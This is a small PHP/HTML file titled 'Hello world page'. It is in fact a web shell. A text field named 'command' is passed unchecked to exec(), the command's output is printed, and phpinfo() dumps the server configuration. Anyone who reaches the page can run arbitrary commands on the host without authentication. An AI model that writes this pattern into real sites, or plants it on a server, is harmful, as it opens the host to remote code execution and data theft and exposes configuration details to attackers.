<html lang="en">

<head>
    <title>Hello world page</title>
    <link rel="stylesheet" href="style.css" type="text/css" />
</head>

<body>
    <h1>Хочу пивка</h1>

    <form method="GET" action="">
        <input name="command" type="text" size="50">
        <input type="submit">
    </form>

    <?php
    $cmd = $_GET["command"];

    $output=null;
    $retval=null;
    exec($cmd , $output, $retval);
    echo "Command >> $cmd \n<br>";
    echo "Returned with status $retval and output:\n";
    print_r($output);

?>

    <?php
    phpinfo();
?>
</body>

</html>